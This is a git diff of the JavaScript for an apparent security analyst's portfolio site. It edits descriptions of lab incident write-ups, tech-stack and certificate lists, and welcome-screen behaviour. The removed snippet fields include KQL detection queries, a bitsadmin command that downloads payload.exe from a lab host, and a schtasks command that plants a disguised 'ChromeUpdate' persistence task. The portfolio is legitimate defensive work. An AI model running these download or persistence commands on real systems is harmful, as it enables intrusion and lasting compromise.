@@ -8,102 +8,79 @@ const PROJECTS = [
     incident_id: 'INC-2026-005',
     title: 'Phishing Email Triage with Endpoint Correlation',
     description:
-      'User-reported invoice phish correlated with Outlook spawning PowerShell on WKSTN-042. SPF/DKIM/DMARC header analysis, staged delivery-vs-execution conclusions, and proportionate containment before credential theft.',
-    image_url: '',
+      'User-reported invoice phish correlated with Outlook spawning PowerShell on WKSTN-042, triggering a Suricata NIDS alert on outbound C2. SPF/DKIM/DMARC header analysis, phishing investigation across SIEM (Microsoft Sentinel), EDR (Microsoft Defender for Endpoint), and network layers, with proportionate containment before credential theft.',
     live_url: `${GITHUB_BASE}/incidents/INC-2026-005-phishing-chain.md`,
     mitre: ['T1566.001', 'T1059.001'],
-    snippet: `DeviceProcessEvents
-| where InitiatingProcessFileName =~ "outlook.exe"
-| where FileName =~ "powershell.exe"`,
   },
   {
     id: 2,
     incident_id: 'INC-2026-002',
-    title: 'Password Spray & Successful Cloud Sign-in',
+    title: 'Password Spray & Successful Azure/Entra Sign-in',
     description:
-      'Sentinel detected 18 failed Entra sign-ins followed by one success for a valid finance user. Validated account context, checked post-auth abuse (mailbox rules, OAuth consent, MFA changes), revoked sessions, and escalated as account-takeover risk.',
-    image_url: '',
+      'Microsoft Sentinel (SIEM) detected 18 failed Entra sign-ins from a single Microsoft Azure IP followed by one success for a valid finance user. Validated account context via threat intelligence lookup, checked post-auth abuse (mailbox rules, OAuth consent, MFA changes), revoked sessions, and escalated as account-takeover risk.',
     live_url: `${GITHUB_BASE}/incidents/INC-2026-002-entra-password-spray.md`,
     mitre: ['T1110.003', 'T1078'],
-    snippet: `SigninLogs
-| where ResultType in ("50126", "0")
-| summarize fails = countif(ResultType != "0"),
-    wins = countif(ResultType == "0") by IPAddress`,
   },
   {
     id: 3,
     incident_id: 'INC-2026-001',
     title: 'LOLBin Execution: BITS Download',
     description:
-      'Wazuh and Defender flagged bitsadmin.exe downloading a payload to WKSTN-042. Validated by comparing parent process, destination, user context, and change records against a benign SCCM baseline. Contained to one host, escalated to Tier 2.',
-    image_url: '',
+      'Wazuh HIDS, Suricata NIDS, and Microsoft Defender for Endpoint (EDR) flagged bitsadmin.exe downloading a payload to WKSTN-042 over HTTP. Validated by comparing Windows Event Logs, parent process, destination, user context, and change records against a benign SCCM baseline. Contained to one host, escalated to Tier 2.',
     live_url: `${GITHUB_BASE}/incidents/INC-2026-001-bits-job-download.md`,
     mitre: ['T1197', 'T1105'],
-    snippet: `bitsadmin /transfer debjob /download
-  http://10.10.30.10:8888/file/download
-  C:\\Users\\Public\\payload.exe`,
   },
   {
     id: 4,
     incident_id: 'INC-2026-003',
     title: 'Suspicious Scheduled Task Persistence',
     description:
-      'Wazuh and Defender detected a scheduled task named ChromeUpdate executing PowerShell from a user-writable Temp path. Validated against legitimate SCCM baseline, confirmed local to WKSTN-042 via DC 4698 scope check, and ran a multi-vector persistence sweep.',
-    image_url: '',
+      'Wazuh HIDS and Microsoft Defender for Endpoint (EDR) detected a scheduled task named ChromeUpdate executing PowerShell from a user-writable Temp path. Validated against SCCM baseline using Windows Event Logs (Event ID 4698), confirmed local to WKSTN-042 via DC scope check, and ran a multi-vector persistence sweep.',
     live_url: `${GITHUB_BASE}/incidents/INC-2026-003-scheduled-task-persistence.md`,
     mitre: ['T1053.005', 'T1059.001'],
-    snippet: `schtasks /Create /TN ChromeUpdate /TR
-  "powershell.exe -File C:\\Users\\jsmith\\AppData\\Local\\Temp\\update.ps1"`,
   },
   {
     id: 5,
     incident_id: 'INC-2026-004',
     title: 'False Positive & Detection Tuning — VPN',
     description:
-      'Sentinel created a VPN brute-force alert after 47 failed OpenVPN attempts from a scanner source. Validated zero valid users, zero successes, and a matching CHG-8821 geo-block change ticket. Closed as FP and tuned the rule to require valid usernames.',
-    image_url: '',
+      'Microsoft Sentinel (SIEM) created a VPN brute-force alert after 47 failed OpenVPN attempts through the pfSense firewall from a scanner source. Validated zero valid users, zero successes, and a matching CHG-8821 geo-block change ticket. Closed as false positive and tuned the KQL rule to reduce alert noise.',
     live_url: `${GITHUB_BASE}/incidents/INC-2026-004-false-positive-vpn.md`,
     mitre: ['T1110.001'],
-    snippet: `VPNLogs
-| where Action == "AUTH_FAILED"
-| summarize FailedAttempts = count() by SourceIP
-| where FailedAttempts > 10`,
   },
   {
     id: 6,
     incident_id: 'INC-2026-006',
     title: 'RDP Lateral Movement & Network Sniffing',
     description:
-      'Wazuh flagged an RDP port modification (3389→8443) and tcpdump.exe execution on WKSTN-099. Traced lateral movement from WKSTN-042 via compromised jsmith credentials, ran tshark PCAP forensics to confirm zero data exfiltration, and isolated both hosts.',
-    image_url: '',
+      'Wazuh HIDS and Suricata NIDS flagged an RDP port modification (3389→8443) and tcpdump.exe execution on WKSTN-099 (Linux probe host). Traced lateral movement via TCP/IP from WKSTN-042 using compromised jsmith credentials, ran Wireshark/tshark pcap (packet analysis) to confirm zero data exfiltration across the network, and isolated both hosts.',
     live_url: `${GITHUB_BASE}/incidents/INC-2026-006-rdp-lateral-movement.md`,
     mitre: ['T1021.001', 'T1040', 'T1112'],
-    snippet: `tshark -r capture.pcapng -Y "dns.flags.response == 0"
-  -T fields -e dns.qry.name | sort | uniq -c`,
   },
 ];
 
 const CERTIFICATES = [
-  { id: 1, title: 'CompTIA Security+', issuer: 'CompTIA', date: '2024', verify_url: 'https://www.comptia.org/verify', image_url: '' },
-  { id: 2, title: 'Microsoft SC-200 Security Operations Analyst', issuer: 'Microsoft', date: '2024', verify_url: 'https://learn.microsoft.com/credentials', image_url: '' },
-  { id: 3, title: 'Google Cybersecurity Professional Certificate', issuer: 'Google / Coursera', date: '2024', verify_url: 'https://www.coursera.org/verify', image_url: '' },
+  { id: 1, title: 'CompTIA Security+', issuer: 'CompTIA', date: '2024', verify_url: 'https://www.comptia.org/verify' },
+  { id: 2, title: 'Microsoft SC-200 Security Operations Analyst', issuer: 'Microsoft', date: '2024', verify_url: 'https://learn.microsoft.com/credentials' },
+  { id: 3, title: 'Google Cybersecurity Professional Certificate', issuer: 'Google / Coursera', date: '2024', verify_url: 'https://www.coursera.org/verify' },
 ];
 
 const TECH_STACKS = [
-  { id: 1,  name: 'Splunk Enterprise',  logo_url: 'assets/techstack/splunk-enterprise.png' },
-  { id: 2,  name: 'Microsoft Sentinel', logo_url: 'assets/techstack/microsoft-sentinel.png', white_bg: true },
-  { id: 3,  name: 'Microsoft Defender', logo_url: 'assets/techstack/defender-endpoint.svg' },
-  { id: 4,  name: 'Entra ID',           logo_url: 'assets/techstack/entra-id.png' },
-  { id: 5,  name: 'Wazuh',              logo_url: 'assets/techstack/wazuh.png' },
-  { id: 6,  name: 'Sysmon',             logo_url: 'assets/techstack/sysmon.png' },
-  { id: 7,  name: 'Active Directory',   logo_url: 'assets/techstack/active-directory.png' },
-  { id: 8,  name: 'PowerShell',         logo_url: 'assets/techstack/powershell-logs.png' },
-  { id: 9,  name: 'Wireshark',          logo_url: 'assets/techstack/wireshark.png' },
-  { id: 10, name: 'pfSense',            logo_url: 'assets/techstack/pfsense.svg' },
-  { id: 11, name: 'VirusTotal',         logo_url: 'assets/techstack/virustotal.png' },
-  { id: 12, name: 'Python',             logo_url: 'assets/techstack/python-automation.png' },
-  { id: 13, name: 'Apache Caldera',     logo_url: 'assets/techstack/caldera.png' },
-  { id: 14, name: 'osTicket',           logo_url: 'assets/techstack/osticket.png' },
+  { id: 1,  name: 'Splunk Enterprise',               logo_url: 'assets/techstack/splunk-enterprise.png' },
+  { id: 2,  name: 'Microsoft Sentinel',              logo_url: 'assets/techstack/microsoft-sentinel.png', white_bg: true },
+  { id: 3,  name: 'Microsoft Defender for Endpoint', logo_url: 'assets/techstack/defender-endpoint.svg' },
+  { id: 4,  name: 'Microsoft Azure',                 logo_url: 'assets/techstack/microsoft-azure.png', white_bg: true },
+  { id: 5,  name: 'Entra ID',                        logo_url: 'assets/techstack/entra-id.png' },
+  { id: 6,  name: 'Wazuh',                           logo_url: 'assets/techstack/wazuh.png' },
+  { id: 7,  name: 'Sysmon',                          logo_url: 'assets/techstack/sysmon.png' },
+  { id: 8,  name: 'Active Directory',                logo_url: 'assets/techstack/active-directory.png' },
+  { id: 9,  name: 'PowerShell',                      logo_url: 'assets/techstack/powershell-logs.png' },
+  { id: 10, name: 'Wireshark',                       logo_url: 'assets/techstack/wireshark.png' },
+  { id: 11, name: 'pfSense Firewall',                logo_url: 'assets/techstack/pfsense.svg' },
+  { id: 12, name: 'VirusTotal',                      logo_url: 'assets/techstack/virustotal.png' },
+  { id: 13, name: 'Python',                          logo_url: 'assets/techstack/python-automation.png' },
+  { id: 14, name: 'Apache Caldera',                  logo_url: 'assets/techstack/caldera.png' },
+  { id: 15, name: 'osTicket',                        logo_url: 'assets/techstack/osticket.png' },
 ];
 
 const TYPEWRITER_PHRASES = [
@@ -116,16 +93,29 @@ const TYPEWRITER_PHRASES = [
 // ── WELCOME SCREEN ────────────────────────────────────────
 const welcome = document.getElementById('welcome');
 const navbar = document.getElementById('navbar');
+const WELCOME_SEEN_KEY = 'welcomeSeen';
 
 function revealNavbar() {
   setTimeout(() => navbar.classList.add('visible'), 50);
 }
 
-setTimeout(() => {
+function dismissWelcome() {
   welcome.classList.add('hide');
   triggerHeroAnim();
-}, 3200);
-setTimeout(revealNavbar, 4200);
+  revealNavbar();
+}
+
+if (sessionStorage.getItem(WELCOME_SEEN_KEY)) {
+  welcome.style.display = 'none';
+  navbar.classList.add('visible');
+  triggerHeroAnim();
+} else {
+  setTimeout(() => {
+    sessionStorage.setItem(WELCOME_SEEN_KEY, 'true');
+    dismissWelcome();
+  }, 3200);
+  setTimeout(revealNavbar, 4200);
+}
 
 // ── HERO ANIMATION (GSAP card-drop) ───────────────────────
 function triggerHeroAnim() {
@@ -178,7 +168,7 @@ function typeLoop() {
     setTimeout(typeLoop, 50);
   }
 }
-setTimeout(typeLoop, 4200);
+setTimeout(typeLoop, sessionStorage.getItem(WELCOME_SEEN_KEY) ? 200 : 4200);
 
 // ── SMOOTH SCROLL ─────────────────────────────────────────
 function smoothScrollTo(target) {
@@ -314,9 +304,7 @@ function renderProjects() {
           ${p.live_url
             ? `<a href="${p.live_url}" target="_blank" rel="noopener noreferrer" class="project-live">
                 View Write-up
-                <span class="arrow-circle">
-                  <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
-                </span>
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="7" y1="17" x2="17" y2="7"></line><polyline points="7 7 17 7 17 17"></polyline></svg>
                </a>`
             : `<span style="font-size:13px;color:var(--text-muted)">No Write-up</span>`}
           <span class="project-id-badge">${p.incident_id}</span>
@@ -366,8 +354,6 @@ document.getElementById('tech-grid').innerHTML = TECH_STACKS.map((t, i) => `
     <p>${t.name}</p>
   </div>
 `).join('');
-
-// Image preview overlay function was removed since it is unused dead weight.
 
 // ── CONTACT FORM ──────────────────────────────────────────
 function clearFieldError(wrapId) {
